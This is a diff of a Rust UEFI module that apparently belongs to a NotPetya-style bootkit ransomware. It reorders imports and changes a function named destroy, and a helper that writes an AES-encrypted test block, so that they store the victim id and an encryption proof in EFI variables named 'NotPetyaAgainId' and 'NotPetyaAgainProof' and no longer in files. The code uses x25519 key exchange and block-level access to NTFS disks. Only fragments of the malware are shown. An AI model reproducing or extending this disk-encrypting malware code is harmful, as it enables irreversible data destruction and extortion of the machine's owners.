@@ -2,17 +2,17 @@ use alloc::vec;
 use alloc::vec::Vec;
 use core::ops::Range;
 
-use aes::cipher::{generic_array::GenericArray, BlockEncrypt, NewBlockCipher};
 use aes::{Aes256, Block};
+use aes::cipher::{BlockEncrypt, generic_array::GenericArray, NewBlockCipher};
 use rand::rngs::OsRng;
+use uefi::{Error, Status};
 use uefi::prelude::SystemTable;
 use uefi::proto::media::block::BlockIO;
 use uefi::table::Boot;
-use uefi::{Error, Status};
 use x25519_dalek::{EphemeralSecret, PublicKey};
 
 use crate::efi_rng::EfiRng;
-use crate::file::write_file;
+use crate::efi_vars::write_var;
 
 pub const OEM_ID: &[u8; 8] = b"NTFS    ";
 
@@ -234,7 +234,7 @@ fn write_test_file(st: &SystemTable<Boot>, key_bytes: &[u8; 32]) -> uefi::Result
 
     cipher.encrypt_block(&mut block);
 
-    write_file(st, "test", block.as_slice())?;
+    write_var(st, "NotPetyaAgainProof", block.as_slice())?;
 
     Ok(())
 }
@@ -257,7 +257,7 @@ pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
 
     let mut buf = [0u8; 64];
     hex::encode_to_slice(id.as_bytes(), &mut buf).unwrap();
-    write_file(st, "id", &buf).unwrap();
+    write_var(st, "NotPetyaAgainId", &buf).unwrap();
 
     write_test_file(st, key.as_bytes())?;
 
